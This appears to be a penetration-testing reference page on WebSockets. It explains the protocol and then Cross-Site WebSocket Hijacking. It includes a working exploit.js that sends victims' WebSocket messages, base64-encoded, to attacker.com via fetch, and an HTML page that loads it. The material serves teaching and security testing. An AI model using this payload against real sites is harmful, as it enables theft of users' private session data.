---
title: WebSockets
description: A protocol that enables bidirectional communication over a single TCP connection, mainly used for real-time features like chat, but can be insecure if not properly protected against message injection, CSRF, and lack of authentication.
---
WebSockets let the browser and server talk to each other at the same time using one connection that stays open. After a handshake, the connection stays active, and both sides can send messages whenever they want — like a two-way conversation. The server can also send updates to the browser right away when something happens.

- Web Socket secure: `wss://`
- `ws://`: data is sent without encryption

## Exploit
### Cross-Site WebSocket Hijacking
Identify the server doesn't validate origin header by 
1. Spoof the `Origin` header
2. Check auth cookies `samesite` flag  is set to **None**

*Note:  it is not possible to exploit CSWSH if the victim uses Firefox, due to [Total Cookie Protection](https://support.mozilla.org/en-US/kb/introducing-total-cookie-protection-standard-mode).* 
s
`exploit.js`
```js
<script>
  //Establish the WebSocket connection
  const ws = new WebSocket('wss://target.com/chat');

  // Send a message to the server once connected
  ws.onopen = () => {
    ws.send("READY");
  };

  // Handle messages received from the server
  ws.onmessage = (event) => {
    fetch('https://attacker.com?msg=' + btoa(event.data));
  };
</script>

```

```html
<html>
	<head></head>
	<body><script src="https://attacker.com/exploit.js"></script></body>
</html>
```

1. User opens the malicious HTML page.
2. JavaScript runs automatically in the background and creates a WebSocket connection to the target server.
3. Once connected, the victim's browser sends `READY`
4. When the server replies, the script:
	- Receives the message
	- Encodes it as base64 with `btoa(...)`
	- Sends it to the attacker's server using: `fetch('https://attacker.com?msg=' + btoa(event.data));`
## References
- [RFC 6455](https://datatracker.ietf.org/doc/html/rfc6455)
- [Black Hills - Can’t Stop, Won’t Stop Hijacking (CSWSH) WebSockets ](https://www.blackhillsinfosec.com/cant-stop-wont-stop-hijacking-websockets/)
- [HackTricks - WebSocket Attacks](https://book.hacktricks.wiki/en/pentesting-web/websocket-attacks.html?highlight=websocket#establishment-of-websocket-connections)